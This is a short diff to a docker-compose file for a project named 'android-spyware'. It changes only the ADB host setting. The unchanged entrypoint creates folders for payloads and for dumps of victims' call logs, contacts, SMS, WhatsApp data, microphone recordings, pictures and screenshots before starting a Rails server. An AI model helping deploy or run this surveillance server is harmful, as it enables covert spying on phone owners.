@@ -13,7 +13,7 @@ services:
     entrypoint: sh -c "mkdir -p /app/android-spyware/files/payloads /app/android-spyware/files/dumps/calllogs_dumps /app/android-spyware/files/dumps/contacts_dumps /app/android-spyware/files/dumps/microphone_recs /app/android-spyware/files/dumps/pictures /app/android-spyware/files/dumps/screen_snaps /app/android-spyware/files/dumps/sms_messages_dumps /app/android-spyware/files/dumps/whatsapp | rails s -b 0.0.0.0 -p 80"
     tty: true
     environment:
-      ADB_HOST: gateway.docker.internal
+      ADB_HOST: host.docker.internal
       #MAPS_API_KEY: YOUR KEY HERE
   db:
     image: costincanciu/android-spyware-db:latest
